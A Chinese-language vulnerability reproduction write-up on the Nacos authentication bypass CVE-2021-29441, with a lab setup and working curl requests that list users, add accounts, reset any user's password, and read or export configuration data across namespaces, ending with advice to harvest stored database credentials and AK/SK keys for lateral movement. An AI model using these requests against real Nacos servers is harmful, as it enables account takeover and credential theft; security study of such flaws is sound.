# 从 Nacos CVE-2021-29441 到新型利用方式探索
# 0x01 漏洞原理
Nacos 是 `Dynamic Naming and Configuration Service` 的首字母简称，是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，可以快速实现动态服务发现、服务配置、服务元数据及流量管理。

## 1.1 Nacos 认证绕过漏洞（CVE-2021-29441）
在 Alibaba Nacos 2.0 版本存在一个由于 `User-Agent` 处理不当导致的未授权访问漏洞 `CVE-2021-29441` ，该漏洞发生在 `Nacos` 在进行认证授权操作时，会判断请求的 `User-Agent` 是否为”Nacos-Server”，如果是的话则不进行任何认证。开发者原意是用来处理一些服务端对服务端的请求。但是由于配置的过于简单，并且将协商好的 `user-agent` 设置为 `Nacos-Server` ，直接硬编码在了代码里，导致了漏洞的出现，从而导致能够添加任意用户、修改任意用户密码等等问题。

## 1.2 Nacos 新的利用方式探索
- 来自 [云原⽣组件Nacos新型红队手法研究 @默安逐日实验室](https://mp.weixin.qq.com/s/Jwwd5ailKNhwR57ACXB1kQ)

基于 `CVE-2021-29441` 的几种利用方式无非就是读取用户账号密码、未授权添加用户、任意用户密码更改这几种常见的，防守方通常会通过WAF规则直接拦截掉这几个URL请求。

实际上，根据鉴权相关文档(https://nacos.io/en-us/docs/auth.html)， 发现默认启动 Nacos 就是不开启鉴权的，而且还有许多可以利用的接口，后续漏洞复现部分进行举例。

# 0x02 环境搭建
使用 Ubuntu 进行环境搭建，这里搭建的是最新的 Nacos 2.2.0  (Dec 14, 2022)。
```shell
sudo apt-get update
sudo apt-get install default-jdk
sudo ufw disable
wget https://github.com/alibaba/nacos/releases/download/2.2.0/nacos-server-2.2.0.zip
unzip nacos-server-2.2.0.zip
cd nacos/bin
bash startup.sh -m standalone
```
访问 http://ip:8848/nacos/ ，如果出现 Nacos 登陆界面说明部署成功，默认用户名密码为 `nacos/nacos` 。

![image](https://user-images.githubusercontent.com/84888757/209051139-96fec007-7ef8-494e-822e-91476c1faf2a.png)

# 0x03 漏洞复现
## 3.1 读取用户账号密码
使用老版本 Nacos CVE-2021-29441 的 payload ：
```shell
curl 'http://ip:8848/nacos/v1/auth/users?pageNo=1&pageSize=9' -H 'User-Agent: Nacos-Server'
```
出现报错：提示说是缺少 `search=blur` 或者 `search=accurate` 。

![image](https://user-images.githubusercontent.com/84888757/209053410-37caf518-9d39-4499-9685-19cf605407af.png)


加上再试试看，成功读取。

```shell
curl 'http://ip:8848/nacos/v1/auth/users?pageNo=1&pageSize=9&search=blur' -H 'User-Agent: Nacos-Server'
或
curl 'http://ip:8848/nacos/v1/auth/users?pageNo=1&pageSize=9&search=accurate' -H 'User-Agent: Nacos-Server'
```

![image](https://user-images.githubusercontent.com/84888757/209051343-79f014f7-6837-4cb8-8f52-6c3951631093.png)

![image](https://user-images.githubusercontent.com/84888757/209051375-7f94c8a4-c205-4c07-9ad3-99ad0a938637.png)

在未开启鉴权的情况下，不加 `User-Agent` 也可以，后续的示例就都不加 `User-Agent` 了，我们仅讨论未开启鉴权的几种接口的利用。
```shell
http://ip:8848/nacos/v1/auth/users?pageNo=1&pageSize=9&search=blur
```

![image](https://user-images.githubusercontent.com/84888757/209051623-fbe7f34f-2846-4404-a753-75a48c6e6b7a.png)

## 3.2 未授权添加用户
```shell
curl -X POST 'http://ip:8848/nacos/v1/auth/users?username=test2&password=test2'
```

![image](https://user-images.githubusercontent.com/84888757/209051802-b20658ca-fe24-4104-87ad-b6da989707a5.png)

然后可以使用 `test2/test2` 登录。

![image](https://user-images.githubusercontent.com/84888757/209051850-2bccfc7f-6bb2-4bb7-b3f6-87a3bbc8c52c.png)

## 3.3 任意用户密码更改
实战中最好还是不要修改客户的密码。
```shell
curl -X PUT 'http://ip:8848/nacos/v1/auth/users?accessToken=' -H 'User-Agent:Nacos-Server' -d 'username=test1&newPassword=test2'
```

## 3.4 获取配置数据-默认 public Namespace
```
http://ip:8848/nacos/v1/cs/configs?search=accurate&dataId=&group=&pageNo=1&pageSize=99
```
或者
```shell
curl -X GET 'http://ip:8848/nacos/v1/cs/configs?search=blur&dataId=&group=&pageNo=1&pageSize=99'
```

![image](https://user-images.githubusercontent.com/84888757/209052012-79bdfcc1-1504-4371-a160-1683817780a6.png)

## 3.5 获取其他Namespace的配置数据

然而使用者完全可以不把数据放到默认的 `public namespace`，而是自己新建一个 `namespace` ，再把新的相关配置放在里面。

### 3.5.1 获取 Namespace 列表
```
http://ip:8848/nacos/v1/console/namespaces
```

![image](https://user-images.githubusercontent.com/84888757/209052061-590c5782-3443-4e15-a82f-db0ddab0f1bf.png)


### 3.5.2 读取非 public 空间的数据
读取配置数据时使用的 `tenant` 参数获取的就是 `namespace`，我们直接把 `tenant=namespace` 加进去构造请求，就可以读取到 **非** `public namespace` 的数据，如果 `tenant` 参数值为空就默认读取 `public namespace` 的数据。
```
http://ip:8848/nacos/v1/cs/configs?search=accurate&dataId=&group=&pageNo=1&pageSize=99&tenant=de9d95b2-9532-48ba-a0ea-549e4012cde6
```

![image](https://user-images.githubusercontent.com/84888757/209052632-57d9f2bb-2bb6-4a89-92de-37e0b9c6ba2c.png)

## 3.6 配置文件导出
### 3.6.1 获取 Namespace 列表
```
http://ip:8848/nacos/v1/console/namespaces
```

![image](https://user-images.githubusercontent.com/84888757/209052061-590c5782-3443-4e15-a82f-db0ddab0f1bf.png)


### 3.6.2 下载非public空间的数据
跟上面的类似，其中 `tenant` 为空默认下载 `public namespace` 的数据，如果要下载其他命名空间的配置文件则重复之前的先获取 `namespace` 然后赋值给 `tenant` 即可。

```
http://ip:8848/nacos/v1/cs/configs?export=true&tenant=de9d95b2-9532-48ba-a0ea-549e4012cde6&group=&appName=&ids=
```

<div align=center><img width="910" alt="image" src="https://user-images.githubusercontent.com/84888757/209053977-ad81fdad-350e-4e4f-a08c-2894f0d9b6a0.png" /></div>


![image](https://user-images.githubusercontent.com/84888757/209052891-f2ab5a4f-77ba-4530-b314-ef30a7c2d528.png)

## 3.7 后续利用思路
在 `Nacos` 中可能保存了很多配置文件信息，比如数据库连接信息、 `AK/SK` 等，将其制作成密码本进行打点或者内网横向都很有用。

# 0x04 参考链接
- https://mp.weixin.qq.com/s/Jwwd5ailKNhwR57ACXB1kQ
- [vulhub/nacos/CVE-2021-29441](https://github.com/vulhub/vulhub/blob/master/nacos/CVE-2021-29441/README.zh-cn.md)






